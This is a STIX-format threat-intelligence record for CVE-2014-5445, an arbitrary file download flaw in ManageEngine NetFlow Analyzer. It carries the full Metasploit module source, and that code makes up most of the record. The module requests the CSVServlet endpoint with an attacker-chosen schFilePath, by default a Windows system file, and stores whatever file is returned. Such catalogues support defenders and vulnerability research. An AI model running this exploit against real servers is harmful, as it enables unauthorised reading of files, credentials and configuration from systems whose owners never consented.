{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--615ff8d4-9ec6-4868-9e9c-f37829ec42f1",
    "created": "2024-08-14T16:23:08.085263Z",
    "modified": "2024-08-14T16:23:08.085267Z",
    "name": "ManageEngine NetFlow Analyzer Arbitrary File Download",
    "description": " This module exploits an arbitrary file download vulnerability in CSVServlet on ManageEngine NetFlow Analyzer. This module has been tested on both Windows and Linux with versions 8.6 to 10.2. Note that when typing Windows paths, you must escape the backslash with a backslash. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/netflow_file_download.rb",
            "external_id": "netflow_file_download.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-5445"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2014/Dec/9"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/pedrib/PoC/blob/master/advisories/ManageEngine/me_netflow_it360_file_dl.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'ManageEngine NetFlow Analyzer Arbitrary File Download',\n        'Description' => %q{\n          This module exploits an arbitrary file download vulnerability in CSVServlet\n          on ManageEngine NetFlow Analyzer. This module has been tested on both Windows\n          and Linux with versions 8.6 to 10.2. Note that when typing Windows paths, you\n          must escape the backslash with a backslash.\n        },\n        'Author' => [\n          'Pedro Ribeiro <pedrib[at]gmail.com>', # Vulnerability Discovery and Metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'CVE', '2014-5445' ],\n          [ 'OSVDB', '115340' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2014/Dec/9' ],\n          [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/ManageEngine/me_netflow_it360_file_dl.txt' ]\n        ],\n        'DisclosureDate' => '2014-11-30'\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('TARGETURI',\n                      [ true, 'The base path to NetFlow Analyzer', '/netflow' ]),\n        OptString.new('FILEPATH', [true, 'Path of the file to download', 'C:\\\\windows\\\\system.ini']),\n      ]\n    )\n  end\n\n  def run\n    # Create request\n    begin\n      print_status(\"Downloading file #{datastore['FILEPATH']}\")\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri' => normalize_uri(datastore['TARGETURI'], 'servlet', 'CSVServlet'),\n        'vars_get' => { 'schFilePath' => datastore['FILEPATH'] }\n      })\n    rescue Rex::ConnectionError\n      print_error('Could not connect.')\n      return\n    end\n\n    # Show data if needed\n    if res && res.code == 200\n      if res.body.to_s.bytesize == 0\n        print_error('0 bytes returned, file does not exist or it is empty.')\n        return\n      end\n      vprint_line(res.body.to_s)\n      fname = File.basename(datastore['FILEPATH'])\n\n      path = store_loot(\n        'netflow.http',\n        'application/octet-stream',\n        datastore['RHOST'],\n        res.body,\n        fname\n      )\n      print_good(\"File saved in: #{path}\")\n    else\n      print_error('Failed to download file.')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-11-30"
}